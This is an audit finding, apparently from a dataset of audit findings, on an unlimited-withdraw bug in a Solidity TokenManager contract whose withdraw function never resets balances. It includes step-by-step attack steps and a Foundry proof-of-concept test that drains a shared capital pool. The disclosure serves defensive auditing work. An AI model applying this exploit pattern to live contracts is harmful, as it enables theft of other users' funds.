# [H] TokenManager - Unlimited withdraw

## Summary
Severity: High
Contest weight: 0.7853
Dataset id: 15802
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Due to the fact that the withdraw function from the TokenManager contract does not reset users' balances after withdrawals, users can repeat withdrawals from the contract an unlimited number of times, thus stealing funds from other users.

In the withdraw function of the TokenManager contract, it is possible to unlimitedly withdraw tokens from the CapitalPool contract.

The withdraw function allows any user to withdraw tokens they have earned on their balance, but the user's balance is not updated anywhere after the withdrawal.

The code for getting the user's balance:

```solidity
uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
    _tokenAddress
][_tokenBalanceType];
```

As an example, let's consider the simplest scenario of an attack on a system that will exploit the found vulnerability: First, the user needs to make it so that they have some sort of balance within the TokenManager contract. To do this, it is enough to create an offer using the createOffer function of the PreMarkets contract. During creation, the user will send some tokens as a collateral. Then it is necessary to abort the offer immediately using the abortAskOffer function of the PreMarkets contract. This abort will add a refund amount to the user's balance in the TokenManager contract. Send a huge number of transactions, within which there will be a call to the TokenManager contract withdraw function. The number of transactions will depend on how many tokens are inside the CapitalPool contract.

This is the simplest attack option, but it is possible to create a special contract on whose behalf to interact with the protocol. Then the attack can be accomplished in a single transaction, which will be much more efficient.

Test code that demonstrates the vulnerability described above To run the test, its code without changes should be placed in the PreMarkets.t.sol file.

```solidity
function testunlimitedwithdraw() public {
    vm.startPrank(user);

    capitalPool.approve(address(mockUSDCToken));

    uint256 userPaidAmount = 12000 * 1e18;

    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            10000,
            10000 * 1e18,
            12000,
            300,
            OfferType.Ask,
            OfferSettleType.Turbo
        )
    );
    vm.stopPrank();

    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount);

    vm.startPrank(user2);

    uint256 user2PaidAmount = 120 * 1e18;

    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            10000,
            100 * 1e18,
            12000,
            300,
            OfferType.Ask,
            OfferSettleType.Turbo
        )
    );

    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount + user2PaidAmount);

    address user2OfferAddr = GenerateAddress.generateOfferAddress(1);
    address user2StockAddr = GenerateAddress.generateStockAddress(1);

    preMarktes.abortAskOffer(user2StockAddr, user2OfferAddr);

    assertEq(tokenManager.userTokenBalanceMap(user2, address(mockUSDCToken), TokenBalanceType.MakerRefund), user2PaidAmount);

    uint256 user2BalanceBefore = mockUSDCToken.balanceOf(user2);

    for (uint256 i = 0; i < 101; i++) {
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
    }

    assertEq(mockUSDCToken.balanceOf(address(capitalPool)), 0);
    assertEq(mockUSDCToken.balanceOf(user2) - user2BalanceBefore, userPaidAmount + user2PaidAmount);

    vm.stopPrank();
}
```

It is possible to withdraw absolutely all funds from CapitalPool contract, so this bug is critical.

## Recommendation
Update value in userTokenBalanceMap inside withdraw function.
